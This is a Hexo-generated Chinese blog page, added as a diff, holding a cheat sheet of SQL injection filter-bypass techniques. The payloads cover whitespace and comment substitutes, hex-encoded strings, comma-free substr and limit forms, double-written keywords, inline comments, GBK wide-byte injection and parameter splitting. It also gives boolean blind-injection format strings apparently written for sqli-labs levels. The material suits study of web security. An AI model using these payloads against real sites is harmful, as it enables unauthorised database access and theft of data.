@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sql注入_绕过 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="绕过空格（注释符&#x2F;* *&#x2F;，%a0）两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格： 1%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;*!*&#x2F; （）  最基本的绕过方法，用注释替换空格： 1234&#x2F;* 注释 *&#x2F;&#x2F;**&#x2F;表示注释&#x2F;*!*&#x2F;表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句  例如27a关禁用空">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入_绕过">
+<meta property="og:url" content="http://example.com/2024/01/01/sql%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="绕过空格（注释符&#x2F;* *&#x2F;，%a0）两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格： 1%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;*!*&#x2F; （）  最基本的绕过方法，用注释替换空格： 1234&#x2F;* 注释 *&#x2F;&#x2F;**&#x2F;表示注释&#x2F;*!*&#x2F;表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句  例如27a关禁用空">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-01-01T14:25:15.000Z">
+<meta property="article:modified_time" content="2024-01-01T14:37:59.059Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>38</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-sql注入-绕过" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/01/sql%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="post-time" datetime="2024-01-01T14:25:15.000Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入_绕过
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="绕过空格（注释符-，-a0）"><a href="#绕过空格（注释符-，-a0）" class="headerlink" title="绕过空格（注释符&#x2F;* *&#x2F;，%a0）"></a>绕过空格（注释符&#x2F;* *&#x2F;，%a0）</h3><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/ （）</span><br></pre></td></tr></table></figure>
+
+<p>最基本的绕过方法，用注释替换空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* 注释 */</span><br><span class="line"></span><br><span class="line">/**/表示注释</span><br><span class="line">/*!*/表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句</span><br></pre></td></tr></table></figure>
+
+<p>例如27a关禁用空格，用%0a来代替，布尔盲注代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ &#x27;%0aand%0aascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%0a and&quot;1&quot;=&quot;1&#x27;.format(i,tmp)</span><br></pre></td></tr></table></figure>
+
+<p>26a用（）来代替空格，布尔盲注代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ &quot;anandd(ascii(substr((select (group_concat(table_name) ) from (infoorrmation_schema.tables) where (table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)anandd&#x27;1&#x27;=&#x27;1&quot;.format(i,tmp)</span><br></pre></td></tr></table></figure>
+
+<h3 id="引号绕过（使用十六进制）"><a href="#引号绕过（使用十六进制）" class="headerlink" title="引号绕过（使用十六进制）"></a>引号绕过（使用十六进制）</h3><p>若禁用了双引号“，但我们在以下查询指定表的字段时需要用的双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot; and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p>遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=0x7573657273 and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<h3 id="逗号绕过（使用from或者offset）"><a href="#逗号绕过（使用from或者offset）" class="headerlink" title="逗号绕过（使用from或者offset）"></a>逗号绕过（使用from或者offset）</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+<p>使用join：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+
+<p>使用like：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>对于limit可以使用offset来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1    #等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="or-and-xor-not绕过"><a href="#or-and-xor-not绕过" class="headerlink" title="or and xor not绕过"></a>or and xor not绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br><span class="line">如果是有以上字符则删除再执行，则使用双写或部分大写部分小写绕过</span><br><span class="line">and=anandd    or=oorr</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="绕过注释符号（#，–(后面跟一个空格））过滤"></a>绕过注释符号（#，–(后面跟一个空格））过滤</h3><p>以单引号‘闭合为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br><span class="line">and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过union，select，where等"><a href="#绕过union，select，where等" class="headerlink" title="绕过union，select，where等"></a>绕过union，select，where等</h3><p><strong>（1）使用注释符绕过</strong></p>
+<p>常用注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）使用大小写绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）内联注释绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>
+
+<p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>
+
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般用%df 吃掉 \ ，具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="多参数请求拆分"><a href="#多参数请求拆分" class="headerlink" title="多参数请求拆分"></a>多参数请求拆分</h3><p>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。</p>
+<p>例如请求URL时，GET参数格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=[input1]&amp;b=[input2]</span><br></pre></td></tr></table></figure>
+
+<p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=[input1] and b=[input2]</span><br></pre></td></tr></table></figure>
+
+<p>这时就可以将注入语句进行拆分，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=union/*&amp;b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=union /*and b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/01/sql%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/" data-id="clqv109ks0000qsu4809x4hqn" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F-web%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">网络渗透_web打点_信息搜集</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Hexo</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>38</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2023 - 2024 John Doe<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  
+<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+
+  
+<script src="/plugin/galmenu/GalMenu.js"></script>
+
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
+          
+            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
